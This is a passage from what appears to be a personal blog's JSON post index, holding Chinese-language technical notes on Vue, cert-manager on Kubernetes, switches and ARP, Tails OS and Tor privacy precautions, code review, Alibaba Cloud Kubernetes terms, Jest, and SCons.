&lt;/div&gt; 在 上使用 v-for123456&lt;ul&gt; &lt;template v-for=&quot;item in items&quot;&gt; &lt;li&gt;&#123;&#123; item.msg &#125;&#125;&lt;/li&gt; &lt;li class=&quot;divider&quot; role=&quot;presentation&quot;&gt;&lt;/li&gt; &lt;/template&gt; &lt;/ul&gt; v-for 与 v-if 一同使用正常情况下，v-for 与 v-if 不建议同时使用，因为它们两个有优先级的差别，因此有可能产生预期外的结果；v-for 的优先级高于 v-if，因此当它们同时作用一个元素时，会先渲染出列表，之后再判断是否该某个列表条目； 123&lt;li v-for=&quot;todo in todos&quot; v-if=&quot;!todo.isComplete&quot;&gt; &#123;&#123; todo &#125;&#125; &lt;/li&gt; 在组件上使用 v-for数据不会自动被传递到组件里，需要使用组件的 prop 属性来传递数据； 123456&lt;my-component v-for=&quot;(item, index) in items&quot; v-bind:item=&quot;item&quot; v-bind:index=&quot;index&quot; v-bind:key=&quot;item.id&quot; &gt;&lt;/my-component&gt; 事件处理监听事件v-on 可以用监听一些 DOM 事件，之后触发一些提前写好的操作； 1234&lt;div id=&quot;example-1&quot;&gt; &lt;button v-on:click=&quot;counter += 1&quot;&gt;Add 1&lt;/button&gt; &lt;p&gt;The button above has been clicked &#123;&#123; counter &#125;&#125; times.&lt;/p&gt; &lt;/div&gt; 123456var example1 = new Vue(&#123; el: &#x27;#example-1&#x27;, data: &#123; counter: 0 &#125; &#125;); 事件处理方法操作除了可以作为表达式写在元素中，也可以作一个单独的函数，写在 Vue 实例的方法中； 内联处理器中的方法除了给元素绑定方法外，还可以在元素中直接调用方法 1234&lt;div id=&quot;example-3&quot;&gt; &lt;button v-on:click=&quot;say(&#x27;hi&#x27;)&quot;&gt;Say hi&lt;/button&gt; &lt;button v-on:click=&quot;say(&#x27;what&#x27;)&quot;&gt;Say what&lt;/button&gt; &lt;/div&gt; 12345678new Vue(&#123; el: &#x27;#example-3&#x27;, methods: &#123; say: function (message) &#123; alert(message) &#125; &#125; &#125;); 原始的 DOM 事件可以使用 $event 进行引用，并且还可以作为参数传递给实例的方法或者内置方法； 123&lt;button v-on:click=&quot;warn(&#x27;Form cannot be submitted yet.&#x27;, $event)&quot;&gt; Submit &lt;/button&gt; 123456789methods: &#123; warn: function (message, event) &#123; // 现在我们可以访问原生事件对象 if (event) &#123; event.preventDefault() &#125; alert(message); &#125;&#125; 事件修饰符事件修饰符使用点符号来表示，接在事件名称的后面，常见的事件修饰包括： stop：阻止事件传播 prevent：取消事件的默认行为 capture：优先捕获事件进行处理； self：限制事件在当前元素； once：控制事件只发生一次； passive 123456789101112131415&lt;!-- 阻止单击事件继续传播 --&gt; &lt;a v-on:click.stop=&quot;doThis&quot;&gt;&lt;/a&gt; &lt;!-- 提交事件不再重载页面 --&gt; &lt;form v-on:submit.prevent=&quot;onSubmit&quot;&gt;&lt;/form&gt; &lt;!-- 修饰符可以串联 --&gt; &lt;a v-on:click.stop.prevent=&quot;doThat&quot;&gt;&lt;/a&gt; &lt;!-- 只有修饰符 --&gt; &lt;form v-on:submit.prevent&gt;&lt;/form&gt;&lt;!-- 添加事件监听器时使用事件捕获模式 --&gt; &lt;!-- 即内部元素触发的事件先在此处理，然后才交由内部元素进行处理 --&gt; &lt;div v-on:click.capture=&quot;doThis&quot;&gt;...&lt;/div&gt; 修饰符的顺序是很重要的，不同顺序意味着不一样的行为表现； 按键修饰符按键修饰符用来监听键盘的按键，当某个按键被按下松开后，作出相应的响应； 12&lt;!-- 只有在 `key` 是 `Enter` 时调用 `vm.submit()` --&gt; &lt;input v-on:keyup.enter=&quot;submit&quot;&gt; 系统修饰键系统修饰键比较特殊，它相当于要求在触发某个事件前，相应的系统键需要处于被按下的状态 ctrl alt shift meta .exact 修饰符普通的系统修饰键仅关心某个按键是否被按下，但没有限制是否有多余按键被一起按了；如果要限制仅限某个按键被单独唯一的按下，没有多余的其他键，则可以添加 .exact 修饰符； 1234567&lt;!-- 即使 Alt 或 Shift 被一同按下时也会触发 --&gt; &lt;button v-on:click.ctrl=&quot;onClick&quot;&gt;A&lt;/button&gt; &lt;!-- 有且只有 Ctrl 被按下的时候才触发 --&gt; &lt;button v-on:click.ctrl.exact=&quot;onCtrlClick&quot;&gt;A&lt;/button&gt; &lt;!-- 没有任何系统修饰符被按下的时候才触发 --&gt; &lt;button v-on:click.exact=&quot;onClick&quot;&gt;A&lt;/button&gt; 鼠标按钮修饰符用来限制仅某些鼠标按钮被按下时才会触发的事件 left right middle 表单输入绑定v-model 指令可以在表单输入元素上实现数据的双向绑定；","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"javascript","slug":"javascript","permalink":"http://example.com/tags/javascript/"}]},{"title":"Cert-Manager 证书申请","slug":"Cert-Manager 证书申请","date":"2021-07-20T03:46:00.000Z","updated":"2024-09-21T03:54:53.004Z","comments":true,"path":"2021/07/20/Cert-Manager 证书申请/","permalink":"http://example.com/2021/07/20/Cert-Manager%20%E8%AF%81%E4%B9%A6%E7%94%B3%E8%AF%B7/","excerpt":"","text":"目前腾讯云 EKS 安装 cert-manager 和 alidns webhook 过程中会报错，只能使用 TKE 0. 准备工作 创建集群 1. 安装 cert-manager1kubectl apply -f https://github.com/jetstack/cert-manager/releases/download/v1.3.0/cert-manager.yaml 如果不能访问 github，则可以先下载文件到本地 2. 安装 alidns-webhook1kubectl apply -f https://raw.githubusercontent.com/pragkent/alidns-webhook/master/deploy/bundle.yaml 如果不能访问 github，则可以先下载文件到本地，此步不能太快，需确保第1步安装 cert-manager 时，所有的 pod 都已经正常运行后，再安装 webhook，不然无法成功；当出现失败时，可删除整个 webhook deployment，再重新创建 3. 创建访问 AliDNS 解析用的账号密码12345678apiVersion: v1kind: Secretmetadata: name: alidns-secret namespace: cert-managerdata: # 如果用 stringData，则下面两个属性就不需要编码 access-key: YOUR_ID # 需 base64 转码 secret-key: YOUR_KEY # 需 base64 转码 注：此处的 ID 和 KEY 需要先进行 base64 转码，除非将 data 字段改成 stringData 4. 创建 ClusterIssuer1234567891011121314151617181920212223apiVersion: cert-manager.io/v1alpha2kind: ClusterIssuermetadata: name: letsencryptspec: acme: email: YOUR_EMAIL # Change to your letsencrypt email server: https://acme-v02.api.letsencrypt.org/directory privateKeySecretRef: name: letsencrypt-account-key solvers: - dns01: webhook: groupName: acme.yourcompany.com solverName: alidns config: region: &quot;&quot; accessKeySecretRef: name: alidns-secret key: access-key secretKeySecretRef: name: alidns-secret key: secret-key 5. 创建证书1234567891011apiVersion: cert-manager.io/v1alpha2kind: Certificatemetadata: name: YOUR_CERT_NAME # 证书名，供 pod 引用spec: secretName: www-example-com-tls # 最终签发出来的证书会保存在这个 Secret 里面 dnsNames: - www.example.com # 待签发证书的域名 issuerRef: name: letsencrypt kind: ClusterIssuer 如果创建过程中出现错误，可以使用 kubectl describe &lt;资源类型&gt; &lt; 资源名称&gt; ，根据显示的消息，进行错误排查，例如： kubectl desribe certificate example kubectl describe ClusterIssuer example 详细排查办法查看以下链接：https://cert-manager.io/docs/faq/acme/","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"Kubernetes","slug":"Kubernetes","permalink":"http://example.com/tags/Kubernetes/"}]},{"title":"交换机和路由器的区别","slug":"交换机和路由器的区别","date":"2021-07-18T03:09:00.000Z","updated":"2024-09-21T09:23:15.940Z","comments":true,"path":"2021/07/18/交换机和路由器的区别/","permalink":"http://example.com/2021/07/18/%E4%BA%A4%E6%8D%A2%E6%9C%BA%E5%92%8C%E8%B7%AF%E7%94%B1%E5%99%A8%E7%9A%84%E5%8C%BA%E5%88%AB/","excerpt":"","text":"交换机 交换机工作在第2层，它维护着一份 Mac 地址和网线连接端口的映射表，所有连接它的设备都写在表中。当它收到一个数据包时，它读取数据包中的 Mac 地址，然后从映射表中查到对应的端口号，然后将数据包转发到对应的连接端口； 如果从映射表中找不到 Mac 地址映射，则交换机将简单粗暴的将该数据包发送给所有的端口；之后匹配该 MAC 地址的目标设备会响应交换机，然后交换机就知道拥有该 MAC 地址的设备连接着自己的哪个端口了，然后它会更新自己的映射表，这样下次再有相同的请求进来，就不需要广播，而是直接转发了； 当交换机将数据包广播给所有端口时，其扮演的角色就有点像 Hub 集线器了； 疑问：发起请求的设备，是如何知道目标设备的 MAC 地址的呢？ 路由器 路由器工作在第3层，它有两个职责： 为所有连接它的终端设备建立一个内部局域网； 与外部局域网建立通信； 路由器将从第3层中读取 IP 地址信息，然后从其维护的路由表中找到对应的端口号，将数据包转发给相应的端口号。如果找不到，则直接丢弃数据包； ARP Address Resolution Protocol，地址解析协议，其实就是一份 IP 地址和 MAC 地址的映射表 当某个设备 A 连接到路由器上面时，它会被分配一个 IP 地址，同时会被告知网关的 IP 地址。这样，当该设备尝试与另外一台设备通信时，它会先检查自己的 ARP 表中，是否有目标 IP 的 MAC 地址 如果有，它直接提取该 MAC 地址，写入数据包第2层头部，发送出去； 如果没有，它需要检查一下该目标设备的 IP 是否与自己在同一个局域网中 如果在，它将在局域网中广播一个该 IP 地址的 ARP 请求；持有该 IP 的目标设备将响应该广播，不持有该 IP 的其他设备将忽略该广播； 如果不在，它将在局域网中广播网关 IP 地址的 ARP 请求，网关在收到该广播后，将会响应自己的 MAC 地址给设备 A； 当通过广播获得 MAC 地址后，设备 A 将该 MAC 地址缓存到自己的 ARP 映射表中，然后将其写入数据包第2层头部发送出去； 很奇怪，为什么不直接使用路由器的 MAC 地址来打包呢，这样就不需要额外发送一次 ARP 请求了；路由器收到后，再解析到第3层中的 IP 来获知数据包的目的地，貌似这种方法也是可以的，为什么要额外引入 ARP 机制呢？ 答：原来是因为两台设备不一定通过路由器连接。当它们通过路由器来连接时，上面的方式确实是可行的。但是它们也有可能是直连，或者通过交换机来连接，这个时候，在生成第2层时，就无法直接填写路由器的 IP 地址了；因此，通用的方式是广播 ARP 请求，来得知目标 IP 地址的 MAC 地址。ARP 机制可以工作在任意一种连接场景中，直连，集线器、交换机、路由器等都可以； 关键点：当某个终端设备被连接时，该设备是不知道也无须知道自己连接的是什么类型的设备，它只需关心自己的工作，即打包好各层数据即可。当缺少目标 MAC 地址时，就广播 ARP 请求得到它，然后完成打包并发送数据即可，剩下的工作都是别人的。","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"网络","slug":"网络","permalink":"http://example.com/tags/%E7%BD%91%E7%BB%9C/"}]},{"title":"TailsOS 注意事项","slug":"TailsOS 注意事项","date":"2021-06-29T23:33:00.000Z","updated":"2024-09-21T07:00:19.044Z","comments":true,"path":"2021/06/30/TailsOS 注意事项/","permalink":"http://example.com/2021/06/30/TailsOS%20%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/","excerpt":"","text":"保护个人身份信息可能泄露个人身份信息的活动： 分享带有元信息的文件，常见的文件元信息包含日期、时间、定位、设备信息等； 将 Tails 同时用于多种场景； Tor 的缺陷 当使用 Tor 时，不管对于 ISP，还是对于目标网站，都是透明的，只要它们收集一份 Tor 的中继服务器列表，即可知道当前的访问请求来自 Tor 网络； 当所访问的目标网站没有使用 HTTPS 建立连接时，出口节点可以监听请求内容，甚至伪装成目标网站； 因为 Tor 使用三节点的固定线路，因此通过监听入口节点和出口节点，比对请求时间和数据包，有可能识别出用户身份（这种方法称为端到端关联攻击）； 使用事项 仅当电脑处于关机状态时，再插入并启动，避免在其他系统处于运行状态时插入 U 盘； Tails U 盘只用于运行操作系统，避免用它跟其他操作系统拷贝文件； 尽量避免使用公共电脑运行 Tails，因为其硬件有可能被修改（例如增加键盘记录器来获取输入的各种信息，此时需要通过密码管理器来复制粘贴密码，避免使用键盘输入；或者使用屏幕键盘来点击输入密码）；","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"安全","slug":"安全","permalink":"http://example.com/tags/%E5%AE%89%E5%85%A8/"}]},{"title":"SecurityOS","slug":"SecurityOS","date":"2021-06-21T00:46:00.000Z","updated":"2024-09-21T06:57:50.761Z","comments":true,"path":"2021/06/21/SecurityOS/","permalink":"http://example.com/2021/06/21/SecurityOS/","excerpt":"","text":"主打安全的操作系统主要分成两类： 以匿名为目标； 以研究为目标，一般包含渗透测试工具； 常见的三个以匿名为目标的 OS： Tails：不在主机上安装保存任何文件或程序，这意味着当移动介质（如 U 盘或光盘）被拔走后，主机上找不到使用记录； Qubes：通过创建多个虚拟机，来实现 APP 之间的隔离；这样当某个 APP 被攻击时，不会影响到其他 APP； Whonix：通过将应用和通信分成两个模块，所有应用运行在虚拟机中，所有通信由一个单独的网关模块进行控制；网关默认连接到 Tor 网络中； 三个 OS 实现不同的安全实现，使得它们适用于不同的安全场景，大致如下：","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"安全","slug":"安全","permalink":"http://example.com/tags/%E5%AE%89%E5%85%A8/"}]},{"title":"Code Review","slug":"Code Review","date":"2021-06-21T00:10:00.000Z","updated":"2024-09-21T03:55:33.497Z","comments":true,"path":"2021/06/21/Code Review/","permalink":"http://example.com/2021/06/21/Code%20Review/","excerpt":"","text":"Code Review标准代码审核的目标，是为了让整个项目的代码库，随着时间推移，质量有所进步，而不是发生了退化； 为了达到这个目标，需要做一些取舍： 小步迭代胜于追求完美主义； 确保代码质量不退化，是审核人员的责任； 审核人员对所审核的代码拥有责任和相同的所有权； 原则：只要所提交的代码改进了代码库的质量，即使该代码不完美，也应该审核通过； 质量改进维度： * 更容易维护； * 更容易阅读； * 更容易理解； 经验交流代码走查同时是一种交流经验的机会，但不要强制遵守某种经验。可以在注释中某些更好的做法，但同时备注“仅供参考”； 原则 事实和数据优于看法和偏好； 如果有代码风格规定的话，就遵守规定；没有规定的部分，则按作者的偏好； 软件设计不属于个人偏好的范畴，而应该遵守基本的原则，除非作者能够有充足的理由，能够证明其合理性； 处理冲突 当出现冲突时，双方应根据既有原则达成一致意见； 如果有困难，则向上汇报，由其他人开会讨论协助判断； 走查什么设计 是否设计良好？ 模块之间是否高内聚，低耦合？ 功能 功能是否能如预期那样工作？ 复杂性是否过于复杂了，复杂的标准为“无法快速看懂代码要做什么”；主要包括以下几个层面： 行、函数、类； 是否存在过度工程？ 测试 是否包含单元测试、集成测试、端到端测试？ 测试本身是否正确？ 命名 命名是否合适，让人能够直接从名称看出意图或内容？ 注释 注释是否用来说明原因，而不是用来描述动作？ 是否为正则和复杂算法写了注释？ 注释是否和文档有所区分，文档用来详细描述代码意图、使用方法、最终效果等； 风格 尽量使用既定的风格指南，除非有特殊原因； 文档 如果代码涉及外部使用方式的变化，则检查是否更新了文档（增加或者删除）； 每一行 走查每一行代码，而不是假设某些代码能够正确运行，而忽略对它们的走查； 如果觉得某些代码过于复杂，自己没有把握确保它们的正确性，则应请求其他更有经验和能力的成员的帮助； 如果代码过于难懂，就要求作者解释它们； 宏观视角 尝试站在更宏观的角度来思考代码变更可能带来的影响，而不是仅仅看局部出现变化的代码； 思考新的代码，是否让整个项目的代码质量退化了？如果是的话，应即时修正它；因为大退化总是由无数小退化累积起来的； 不吝赞美 当发现某些代码写得很好时，不要吝啬自己的赞美，在注释中把自己的赞美表达出来； 走查步骤 先宏观的了解新提交的代码的目标（想要做些什么），并思考目标是否有意义，如果没有意义，就诚恳的提出，并给出新目标（如果这种情况经常发生，说明团队缺乏沟通，导致成员的工作目标不一致，应该改进）； 查看提交中发生最大变化的位置；如果发现设计问题，应该第一时间给作者指出，以免对方在错误的基础上继续走太远； 弄清楚目标后，按顺序浏览实现目标的文件；如果可以的话，看主要代码前，先看一下测试，也会对目标的了解提供帮助； 走查速度 走查的速度应该越快越好，因为反馈的越快，它带来的负面效果越小，正面效果越大； 走查的时间不应越过一天；一般来说，今天提交的代码，第二天应该给出反馈； 如果自己当前正在写代码，则不应停下来去做走查，而应该是当自己手头的任务完成后，再走查； 如果自己无法在1天内给出回复，则应该救助其他同事帮忙走查，而不是拖延； 如果提交走查的代码量很大，则应要求作者将它们进行拆分成多个提交； 如何写走查意见 保持谦逊的态度； 说明理由； 鼓励作者简化代码，或者添加注释；","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"}]},{"title":"阿里云的 Kubernetes","slug":"阿里云的 Kubernetes","date":"2021-04-09T01:55:00.000Z","updated":"2024-09-21T09:20:09.807Z","comments":true,"path":"2021/04/09/阿里云的 Kubernetes/","permalink":"http://example.com/2021/04/09/%E9%98%BF%E9%87%8C%E4%BA%91%E7%9A%84%20Kubernetes/","excerpt":"","text":"简单介绍三个版本 专有版：自建 Master 和 Worker 节点，适用于所有场景，更加细颗粒度的管理；承担两种节点的费用； 托管版：自建 Worker 节点，适用于所有场景，无须管理 Master 节点；承担工作节点的费用； Serverless 版：无须建任何节点，按容器实例的使用资源数量和时长收费；适用于批量任务、突发扩容、CI&#x2F;CD 场景； 问：什么是 NAT 网关？ 答：它是构成 VPC 虚拟专用网络的一个核心组成部分；机器实例通过网关对外提供服务，并且接受外部的服务请求，它的作用看起来很像局域网中的路由器；路由器管理着内部的电脑，以统一的 IP 地址对外访问，同时也接收外部的请求，并转发给相应的机器实例； NAT 下面还细分为 SNAT 和 DNAT 两种场景，前者为内部的机器提供访问外部网络的服务；后者则暴露内部的机器，接受外部的请求，对外提供服务； 问：什么是 EIP？ 答：弹性公网 IP，Elastic IP Address；它可以为 NAT 提供物理 IP 地址，这样 NAT 才能正常工作； 问：什么是公网 SLB？ 答：Service Load Balance，负载均衡服务；用来将公网流量平均分发给多个机器实例；需要创建一个监听实例来实现；感觉相当于创建了一台部署了 Nginx 的实例一样； 问：什么是线下 IDC 答：Internet Data Center，互联网数据中心，名称看着很高大上，其实就是运营商或者一些第三方机构建立的机房，出租给企业使用；企业可以在机房中托管机器； 问：什么是 ENI? 答：ENI，elastic network interface，弹性网络接口，说白了，就是虚拟网卡；在配置局域网络时，内部的 IP 地址其实是指向某个虚拟网卡的；因此，当某台机器实例出现故障时，可以将 ENI 跟原机器解绑，然后绑定到新的机器实例中，这样可以在不改变原有的路由配置关系，对外部来说，一切都是透明的，仍然访问旧的 IP，但流量在不知不觉中，被引到了新的机器上面； 问：什么是安全组？ 答：安全组是一种虚拟的防火墙，通过配置一些安全组的规则，来实现对流量的访问控制； 问：什么是 ECI？ 答：Elastic Container Instance，弹性容器实例 命令行工具 价格","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"kubernetes","slug":"kubernetes","permalink":"http://example.com/tags/kubernetes/"}]},{"title":"Jest","slug":"Jest","date":"2021-02-07T03:49:00.000Z","updated":"2024-09-21T04:12:11.429Z","comments":true,"path":"2021/02/07/Jest/","permalink":"http://example.com/2021/02/07/Jest/","excerpt":"","text":"Jest 是一个 javacript 测试框架，特点是简单易上手 安装1npm install jest 需要 node 9.2 以上版本，因为 9.2 以下的版本不支持 try…catch 语法，运行时会报语法错误 Matcher1234567891011121314151617// 字面值使用 toBeexpect(2 + 2).toBe(4);// 对象使用 toEqualconst data = &#123;one: 1&#125;;data[&#x27;two&#x27;] = 2;expect(data).toEqual(&#123;one: 1, two: 2&#125;);// 取反使用 notexpect(4).not.toBe(3);// 字符串可正则匹配expect(&#x27;team&#x27;).not.toMatch(/I/);expect(&#x27;Christoph&#x27;).toMatch(/stop/);// 数组可判断是否包含expect([1, 2]).toContain(1); 异步处理回调模式使用 done 来处理回调模式的异步函数 123456789101112test(&#x27;callback pattern&#x27;, done =&gt; &#123; function callback(data) &#123; try &#123; expect(data).toBe(&#x27;something&#x27;); done(); &#125; catch (error) &#123; done(error); &#125; &#125; fetchData(callback);&#125;); Promise 模式返回 Promise 即可； 123456// 注意此处不要漏了写 return，不然实际返回的是 undefined；test(&quot;promise pattern&quot;, () =&gt; &#123; return fetchData().then(data =&gt; &#123; expect(data).toBe(&#x27;something&#x27;); &#125;)&#125;) Async&#x2F;Await 模式1234567891011121314test(&#x27;Async pattern&#x27;, async () =&gt; &#123; const data = await fetchData(); expect(data).toBe(&#x27;something&#x27;);&#125;);// 带异常的情况test(&#x27;Async pattern with error&#x27;, async () =&gt; &#123; try &#123; const data = await fetchData(); expect(data).toBe(&#x27;something&#x27;); &#125; catch (error) &#123; expect(error).toMatch(&#x27;error&#x27;); &#125;&#125;) 初始化和清理重复初始化1234567beforeEach(() =&gt; &#123; initDB(); // 如果 initDB 函数是异步的，则应为 return initDB()；&#125;);afterEach(() =&gt; &#123; clearDB();&#125;) 一次性初始化1234567beforeAll(() =&gt; &#123; return initDB();&#125;)afterAll(() =&gt; &#123; return clearDB();&#125;) 作用域使用 describe 来建立块的作用域 1234567891011beforeEach(&#x27;parent&#x27;);afterEach(&#x27;parent&#x27;);test(&#x27;parent1&#x27;);test(&#x27;parent2&#x27;);describe(&#x27;block&#x27;, () =&gt; &#123; beforeEach(&#x27;child&#x27;); afterEach(&#x27;child&#x27;); test(&#x27;child1&#x27;); test(&#x27;child2&#x27;);&#125;);// 注意：parent 的 beforeEach 会在 child 的 beforeEach 之前先执行；同时 parent 的 afterEach 在 child 的 afterEach 之后执行； 顺序控制所有的 describe 将在所有的 test 之前先执行； 12345678910111213141516171819202122232425262728293031323334describe(&#x27;outer&#x27;, () =&gt; &#123; console.log(&#x27;outer a&#x27;); describe(&#x27;inner 1&#x27;, () =&gt; &#123; console.log(&#x27;inner 1&#x27;); test(&#x27;test 1&#x27;, () =&gt; &#123; console.log(&#x27;test 1 inner 1&#x27;); &#125;); &#125;); console.log(&#x27;outer b&#x27;); test(&#x27;test 1&#x27;, () =&gt; &#123; console.log(&#x27;test 1 outer&#x27;); &#125;); describe(&#x27;inner 2&#x27;, () =&gt; &#123; console.log(&#x27;inner 2&#x27;); test(&#x27;test 2&#x27;, () =&gt; &#123; console.log(&#x27;test 2 inner 2&#x27;); &#125;); &#125;); console.log(&#x27;outer c&#x27;);&#125;);// 实际的输出顺序如下：// outer a// inner 1// outer b// inner 2// outer c// test 1 inner 1// test 1 outer// test 2 inner 2 单例测试test.only 方法可以使得只有该测试用例被执行；如果多例同时测试失败，但是单例测试可以成功，则说明某两个测试用例之间存在共享的变量，二者在测试过程中出现相互干扰的情况； Mock 函数mock 函数扮演拦截的作用，当在代码中对某个实际的函数进行调用时，拦截该调用，触发提前写好的 mock 函数，返回预设的结果； 用法1234567891011121314const mockFunc = jest.fn(x =&gt; 42 + x);forEach([0, 1], mockFunc);// 检查 mockFunc 是否被调用了两次expect(mockFunc.mock.calls.length).toBe(2);// 检查第一次调用时传入的参数值是否为 0expect(mockFunc.mock.calls[0][0]).toBe(0);// 检查第二次调用时传入的参数值是否为 1expect(mockFunc.mock.calls[1][0]).toBe(1);// 检查第一次调用时的返回值是否为 42expect(mockFunc.mock.results[0].value).toBe(42); 模拟返回值1234567const mock = jest.fn();console.log(mock());// &gt; undefinedmock.mockReturnValueOnce(10).mockReturnValueOnce(&#x27;x&#x27;).mockReturnValue(true);console.log(mock(), mock(), mock(), mock());// &gt; 10, &#x27;x&#x27;, true, true 模拟函数在多次连续调用时，返回不同的值 123456789101112const filterMock = jest.fn();filterMock.mockReturnValueOnce(true).mockReturnValueOnce(false);const result = [11, 12].filter(num =&gt; filterMock(num));console.log(result);console.log(filterMock.mock.calls[0][0]);console.log(filterMock.mock.calls[1][0]);// [11]// 11// 12 模拟模块的返回值123456789// users.js// 此处假设 user.js 调用了 axios 模块，调用其中的 get 方法获取用户数据import axios from &#x27;axios&#x27;;Class Users &#123; static all() &#123; return axios.get(&#x27;/user.json&#x27;).then(resp =&gt; resp.data); &#125;&#125; 12345678910111213// user.test.jsimport Users from &#x27;./users.js&#x27;;import axios from &#x27;axios&#x27;;jest.mock(&#x27;axios&#x27;);test(&#x27;should fetch users&#x27;, () =&gt; &#123; const users = [&#123;name: &#x27;bob&#x27;&#125;]; const resp = &#123;data: users&#125;; // 做了个假数据 axios.get.mockResolvedValue(resp); // 将假数据传进去 return Users.all().then(data =&gt; expect(data).toEqual(users));&#125;) 模拟模块的实现123456789101112// foo.jsmodule.exports = function () &#123; // do something&#125;// test.jsjest.mock(&#x27;../foo&#x27;); // foo 模块已经被伪装const foo = require(&#x27;../foo&#x27;); // 此处调用的 foo 已经是一个模拟函数foo.mockImplementation(() =&gt; 42); // 定义 foo 的行为foo();// &gt; 42 模拟多次调用时，函数表现不同的行为 123456789const mockFn = jest.fn() .mockImplementationOnce(cb =&gt; cb(null, true)) .mockImplementationOnce(cb =&gt; cb(null, false));mockFn((err, val) =&gt; console.log(val));// &gt; truemockFn((err, val) =&gt; console.log(val));// &gt; false 模块多次调用时，不同的行为 + 默认的行为 1234567const myMockFn = jest .fn(() =&gt; &#x27;default&#x27;) .mockImplementationOnce(() =&gt; &#x27;first call&#x27;) .mockImplementationOnce(() =&gt; &#x27;second call&#x27;);console.log(myMockFn(), myMockFn(), myMockFn(), myMockFn());// &gt; &#x27;first call&#x27;, &#x27;second call&#x27;, &#x27;default&#x27;, &#x27;default&#x27; 为模拟函数添加名称通过定义模拟的函数的名称，在测试的输出信息中，能够更清晰的定位哪个函数出错了 1234const mockFn = jest.fn() .mockReturnValue(&#x27;default&#x27;) .mockImplementation(scalar =&gt; scalar + 42) .mockName(&#x27;add42&#x27;); 快照用来比对界面是否与预期的一致；典型的使用方法是给某个 UI 组件预先存一份快照，然后与测试过程中生成的界面进行比对，检查二者是否一致，若一致，表示应用正常；如不一致，说明界面出现了意外的变化，此时有可能是应用出现异常，或者 快照本身需要更新；","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"javascript","slug":"javascript","permalink":"http://example.com/tags/javascript/"}]},{"title":"scons 用法","slug":"scons 用法","date":"2021-01-17T12:16:00.000Z","updated":"2024-09-21T06:56:46.895Z","comments":true,"path":"2021/01/17/scons 用法/","permalink":"http://example.com/2021/01/17/scons%20%E7%94%A8%E6%B3%95/","excerpt":"","text":"1. 基本概念SConstruct 是一个 Python 脚本，作用类似于 Makefile，我们通过它来告诉 Scons 要构建什么东西 2. 常用命令123456# 表示读取 SConstruct 脚本文件，开始构建scons# -c 选项表示清理现场，将构建出来的东西删除掉scons -c# -Q 选项表示安静模式，即不打印构建过程中的提示信息scons -Q 3. 简单构建单个源文件12345678# Program 用来告知 Scons 要构建可执行文件，参数即是源代码Program(&#x27;hello.c&#x27;)# 如果要指代可执行文件的名字，可写在第一个参数上Program(&#x27;my_hello&#x27;, &#x27;hello.c&#x27;)# Object 表示要构建目标文件Object(&#x27;hello.c&#x27;) 多个源文件12345678910# 如果源代码有多个文件，只需将它们放在一个列表中即可Program([&#x27;prog.c&#x27;, &#x27;file1.c&#x27;, &#x27;file2.c&#x27;])# Program 默认以列表第一个元素为最终编译结果的可执行文件的文件名，但是可以自定义Program(&#x27;my_prog&#x27;, [&#x27;prog.c&#x27;, &#x27;file1.c&#x27;, &#x27;file2.c&#x27;])# 如果文件很多个，可以使用关键字和 Glob 命令进行匹配# 通配符包括星号 *，问号 ?，以及部分关键字如 [abc] 表示任意满足 a, b 或 c 的文件均可# 也可以使用 [!abc] 进行排除，即不包括以上几个字母的，即是目标Program(&#x27;prog&#x27;, Glob(&#x27;*.c&#x27;)) 事实上，源代码文件在 Scons 内部都是当作列表来处理，单个文件的情况，会自动添加方括号而已；为了统一，建议还是都加上方括号比较好，同时也可以避免 Python 解释器报语法错误 自动加引号当有多个文件时，需要为每个文件打上双引号，如果文件一多，确实工作量不小；Scons 额外提供了一个 Split 名称，可以为文件自动添加引号，使用方法如下 12345678910111213# 使用 Split 函数自动添加引号，文件名之间只需要使用空格分隔即可Program(&#x27;prog&#x27;, Split(&#x27;main.c file1.c file2.c&#x27;))# 也可以用一个变量来代表多个文件的列表src_files = Split(&#x27;main.c file1.c file2.c&#x27;)Program(&#x27;program&#x27;, src_files)# 文件名之间有多个空格也没有关系# 此处用三个引号是为了符合 Python 对多行字符串的格式要求src_files = Split(&quot;&quot;&quot;main.c file1.c file2.c&quot;&quot;&quot;)Program(&#x27;program&#x27;, src_files) 指定参数名Program 支持指定参数名 12src_files = Split(&#x27;main.c file1.c file2.c&#x27;)Program(target = &#x27;program&#x27;, source = src_files) 多个编译目标如果想在同一个 scons 文件中编译多个可执行文件，只需多次调用 Program 函数即可 12Program(&#x27;foo.c&#x27;)Program(&#x27;bar&#x27;, [&#x27;bar1.c&#x27;, &#x27;bar2.c&#x27;]) 多目标共享源文件办法1：只需要将共享的文件放入源文件列表即可 12345678910# 此处 common1.c 和 common2.c 这两个文件是共享的Program(Split(&#x27;foo.c common1.c common2.c&#x27;))Program(&#x27;bar&#x27;, Split(&#x27;bar1.c bar2.c common1.c common2.c&#x27;))# 如果引用的次数很多，简单的做成变量进行引用即可common = [&#x27;common1.c&#x27;, &#x27;common2.c&#x27;]foo_files = [&#x27;foo.c&#x27;] + commonbar_files = [&#x27;bar1.c&#x27;, &#x27;bar2.c&#x27;] + commonProgram(&#x27;foo&#x27;, foo_files)Program(&#x27;bar&#x27;, bar_files) 办法2：将共享的文件做为库，由不同的目标进行引号 4. 构建和链接库构建库1234567891011# 使用 Library 函数即可构建库Library(&#x27;foo&#x27;, [&#x27;f1.c&#x27;, &#x27;f2.c&#x27;, &#x27;f3.c&#x27;])# 除了指定源文件外，也可以在文件列表中加入目标文件Library(&#x27;foo&#x27;, [&#x27;f1.c&#x27;, &#x27;f2.o&#x27;, &#x27;f3.c&#x27;, &#x27;f4.o&#x27;])# Library 函数默认构建静态库，同时还可以使用 